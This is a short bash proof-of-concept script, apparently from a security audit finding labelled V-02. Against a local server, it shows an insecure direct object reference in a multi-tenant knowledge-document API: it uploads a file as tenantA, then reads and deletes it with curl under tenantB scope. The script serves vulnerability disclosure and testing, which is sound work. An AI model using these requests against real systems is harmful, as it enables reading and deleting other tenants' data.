#!/usr/bin/env bash
# V-02 knowledge IDOR PoC — doc in tenantA read+deleted via tenantB scope.
# NOTE: upload scope is FORM fields; read/delete scope is QUERY params.
set -euo pipefail
BASE=${BASE:-http://127.0.0.1:18777}
printf 'TENANT-A-SECRET content\n' > /tmp/idor_doc.md
curl -s -X POST "$BASE/api/v2/knowledge/documents" \
  -F 'file=@/tmp/idor_doc.md' -F 'title=IDOR Proof' \
  -F 'app_id=tenantA' -F 'project_id=tenantA' | tee /tmp/idor_up.json
DOCID=$(python3 -c "import json;print(json.load(open('/tmp/idor_up.json'))['data']['doc_id'])")
echo "doc_id=$DOCID — wait for cascade catalog indexing (or restart server)"
echo "-- wrong scope read:"; curl -s -w '\nHTTP %{http_code}\n' "$BASE/api/v2/knowledge/documents/$DOCID?app_id=tenantB&project_id=tenantB"
echo "-- wrong scope delete:"; curl -s -w '\nHTTP %{http_code}\n' -X DELETE "$BASE/api/v2/knowledge/documents/$DOCID?app_id=tenantB&project_id=tenantB"
